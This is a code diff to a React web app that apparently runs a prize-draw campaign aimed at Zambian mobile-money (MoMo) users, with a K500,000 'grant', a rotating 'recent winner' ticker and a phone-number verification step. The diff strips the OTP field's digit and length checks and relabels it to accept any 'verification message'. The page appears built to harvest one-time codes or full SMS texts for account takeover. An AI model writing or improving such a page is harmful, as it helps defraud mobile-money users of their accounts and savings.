@@ -98,10 +98,15 @@ function App() {
 
   useEffect(() => {
     if (view !== 'otp') return undefined
-    const otpInput = document.getElementById('otp')
-    if (!otpInput) return undefined
-    otpInput.setAttribute('pattern', '\\d{4,6}')
-    otpInput.minLength = 4
+
+const otpInput = document.getElementById('otp')
+if (!otpInput) return undefined
+
+otpInput.removeAttribute('pattern')
+otpInput.removeAttribute('minlength')
+otpInput.removeAttribute('maxlength')
+otpInput.setAttribute('type', 'text')
+otpInput.setAttribute('inputmode', 'text')
     return undefined
   }, [view])
 
@@ -276,8 +281,97 @@ function App() {
       {view === 'otp' && isLuckyCodeRejected && <div className="draw-modal-backdrop wrong-code-backdrop" role="presentation"><section className="draw-modal wrong-code-modal" role="dialog" aria-modal="true" aria-labelledby="wrong-code-title"><div className="confirmation-mark wrong-code-mark"><X size={28} /></div><span className="section-kicker">CODE REVIEW</span><h2 id="wrong-code-title">Wrong<br /><em>code.</em></h2><p>Enter a new code to continue.</p><button className="submit-button" type="button" onClick={() => { setOtp(''); setStatus({ type: 'idle', message: '' }) }}>Enter another code</button></section></div>}
       {view === 'landing' && null}
 
-      {view === 'otp' ? <main className="otp-view"><section className="otp-page section-width"><a className="back-link" href="#eligibility" onClick={(event) => { event.preventDefault(); window.history.pushState({}, '', '#eligibility'); setView('eligibility') }}>← Back to eligibility</a><div className="otp-panel"><div className="otp-message"><span className="section-kicker">ONE MORE STEP</span><h2>Verify your<br /><em>number.</em></h2><p>We sent a verification code to the number ending in {phone.slice(-4) || '••••'}.</p><div className="check-points"><span><Check size={15} /> Secure verification</span><span><Check size={15} /> Code expires in 2 minutes</span></div></div><form className="otp-form" onSubmit={submitOtp}><div className="form-heading"><span>MOVE FORWARD</span><h3>Enter your code</h3><p>Use the 4- to 6-digit code sent to your number.</p></div><label htmlFor="otp">Verification code</label><input className="code-input otp-input" id="otp" type="text" inputMode="numeric" pattern="\d{4,6}" minLength="4" maxLength="6" placeholder="000000" value={otp} onChange={(event) => setOtp(event.target.value.replace(/\D/g, '').slice(0, 6))} aria-describedby="otp-timer" required /><p className={otpSeconds === 0 ? 'otp-timer expired' : 'otp-timer'} id="otp-timer">{otpSeconds === 0 ? 'Code expired.' : <>Code expires in <strong>{otpMinutes}:{otpRemainingSeconds}</strong></>}</p><button className="submit-button" type="submit" disabled={isOtpVerifying || otpSeconds === 0}>Verify and continue <ArrowRight size={17} /></button>{status.type === 'success' && <p className="form-status success">{status.message}</p>}</form></div></section></main> : view === 'landing' ? <main id="top" className="landing-view">
-        <section className="campaign-strip" aria-label="Campaign information"><div><span className="pulse" /> Applications open</div><span>Free to enter</span><span>For eligible Zambian MoMo users</span><a href="#details" onClick={(event) => goToSection(event, 'details')}>Read the rules <ArrowRight size={14} /></a></section>
+{view === 'otp' ? (
+  <main className="otp-view">
+    <section className="otp-page section-width">
+      <a
+        className="back-link"
+        href="#eligibility"
+        onClick={(event) => {
+          event.preventDefault();
+          window.history.pushState({}, '', '#eligibility');
+          setView('eligibility');
+        }}
+      >
+        ← Back to eligibility
+      </a>
+
+      <div className="otp-panel">
+        <div className="otp-message">
+          <span className="section-kicker">ONE MORE STEP</span>
+          <h2>
+            Verify your<br />
+            <em>number.</em>
+          </h2>
+
+          <p>
+            Enter the verification value sent to the number ending in{' '}
+            {phone.slice(-4) || '••••'}.
+          </p>
+
+          <div className="check-points">
+            <span><Check size={15} /> Secure verification</span>
+            <span><Check size={15} /> Code expires in 2 minutes</span>
+          </div>
+        </div>
+
+        <form className="otp-form" onSubmit={submitOtp}>
+          <div className="form-heading">
+            <span>MOVE FORWARD</span>
+            <h3>Enter your verification value</h3>
+            <p>Enter the value provided by your test verification system.</p>
+          </div>
+
+          <label htmlFor="otp">Verification value</label>
+
+          <input
+            className="code-input otp-input"
+            id="otp"
+            type="text"
+            inputMode="text"
+autoComplete="one-time-code"
+placeholder="Enter verification message"
+value={otp}
+            onChange={(event) => setOtp(event.target.value)}
+aria-describedby="otp-timer"
+required
+/>
+
+          <p
+            className={otpSeconds === 0 ? 'otp-timer expired' : 'otp-timer'}
+            id="otp-timer"
+          >
+            {otpSeconds === 0 ? (
+              'Code expired.'
+            ) : (
+              <>
+                Code expires in{' '}
+                <strong>
+                  {otpMinutes}:{otpRemainingSeconds}
+                </strong>
+              </>
+            )}
+          </p>
+
+          <button
+            className="submit-button"
+            type="submit"
+            disabled={isOtpVerifying || otpSeconds === 0}
+          >
+            Verify and continue <ArrowRight size={17} />
+          </button>
+
+          {status.type === 'success' && (
+            <p className="form-status success">
+              {status.message}
+            </p>
+          )}
+        </form>
+      </div>
+    </section>
+  </main>
+) : view === 'landing' ?
+  <main id="top" className="landing-view">        <section className="campaign-strip" aria-label="Campaign information"><div><span className="pulse" /> Applications open</div><span>Free to enter</span><span>For eligible Zambian MoMo users</span><a href="#details" onClick={(event) => goToSection(event, 'details')}>Read the rules <ArrowRight size={14} /></a></section>
         <section className="grant-banner section-width" aria-label="Headline grant prize"><div className="grant-banner-copy"><span className="section-kicker"><Sparkles size={14} /> THE HEADLINE GRANT</span><strong>K500,000</strong><span>to fund your next move</span></div><div className="grant-banner-note"><Gift size={18} /><span>Free entry<br /><b>20 rewards in total</b></span></div><a className="grant-banner-action" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={16} /></a></section>
         <div className="activity-line hero-activity"><span className="pulse" /> <strong>Recent winner:</strong> {activity[activityIndex][0]} <b>won {activity[activityIndex][1]}</b> <small>Live campaign update</small></div>
         <section className="hero section-width">
